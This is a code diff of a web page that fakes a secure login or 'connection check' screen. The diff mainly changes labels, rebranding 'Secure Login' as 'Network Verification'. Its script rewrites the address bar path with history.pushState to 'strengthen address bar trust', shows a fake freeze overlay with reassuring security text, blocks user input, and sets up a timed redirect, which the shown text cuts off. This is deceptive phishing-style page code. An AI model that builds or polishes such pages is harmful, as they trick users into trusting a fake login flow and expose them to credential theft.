@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Secure Session</title>
+<title>Connection Check</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
   body {
@@ -66,7 +66,7 @@
     text-align: center;
   }
 
-  #freeze .lock {
+  #freeze .icon {
     font-size: 42px;
     margin-bottom: 12px;
   }
@@ -80,11 +80,11 @@
 
 <body>
 
-<button id="trigger">Continue</button>
+<button id="trigger">Check Connection</button>
 
 <div id="panel">
-  <h2>Secure Login</h2>
-  <div class="sub">Verifying your session…</div>
+  <h2>Network Verification</h2>
+  <div class="sub">Establishing a secure channel…</div>
   <div class="spinner"></div>
   <div id="timer">0 ms</div>
 </div>
@@ -92,8 +92,8 @@
 <!-- FREEZE OVERLAY -->
 <div id="freeze">
   <div class="box">
-    <div class="lock">🔒</div>
-    <div class="text">Securing connection…</div>
+    <div class="icon">🛡️</div>
+    <div class="text">Validating connection integrity…</div>
   </div>
 </div>
 
@@ -103,12 +103,12 @@ document.getElementById('trigger').addEventListener('click', () => {
   const timer  = document.getElementById('timer');
   const freeze = document.getElementById('freeze');
 
-  // Strengthen address bar trust
-  history.pushState({}, '', '/auth/login');
+  // Strengthen address bar trust (UNCHANGED)
+  history.pushState({}, '', '/network/check');
 
   panel.style.display = 'block';
 
-  // Fake freeze (non-blocking)
+  // Fake freeze (non-blocking) — UNCHANGED
   freeze.style.display = 'block';
   document.body.style.pointerEvents = 'none';
 
@@ -120,12 +120,12 @@ document.getElementById('trigger').addEventListener('click', () => {
     rafId = requestAnimationFrame(tick);
   }
 
-  // Paint confirmed (WebKit-friendly)
+  // Paint confirmed (UNCHANGED)
   requestAnimationFrame(() => {
     requestAnimationFrame(tick);
   });
 
-  // Microtask chain (safe limit) + RAF-synced redirect
+  // Microtask chain + RAF-synced redirect (UNCHANGED)
   Promise.resolve()
     .then(() => Promise.resolve())
     .then(() => Promise.resolve())
